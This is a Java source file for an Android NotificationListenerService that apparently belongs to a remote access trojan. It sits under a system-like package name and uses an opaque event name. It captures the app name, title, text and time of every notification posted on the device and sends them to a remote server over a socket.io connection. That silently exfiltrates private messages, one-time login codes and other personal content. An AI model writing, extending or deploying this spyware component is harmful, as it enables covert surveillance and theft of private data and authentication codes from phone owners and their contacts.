package com.android.background.services;

import android.app.Notification;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.os.Bundle;
import org.json.JSONObject;
import io.socket.client.Socket;

public class NotificationService extends NotificationListenerService {

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        try {
            String packageName = sbn.getPackageName();
            Notification notification = sbn.getNotification();
            Bundle extras = notification.extras;

            String title = extras.getString(Notification.EXTRA_TITLE);
            CharSequence text = extras.getCharSequence(Notification.EXTRA_TEXT);
            
            if (text == null) return;

            JSONObject data = new JSONObject();
            data.put("appName", packageName);
            data.put("title", title);
            data.put("content", text.toString());
            data.put("postTime", sbn.getPostTime());

            Socket socket = IOSocket.getInstance().getIoSocket();
            if (socket != null && socket.connected()) {
                socket.emit("x0000nt", data);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {
        // Optional: track removed notifications
    }
}
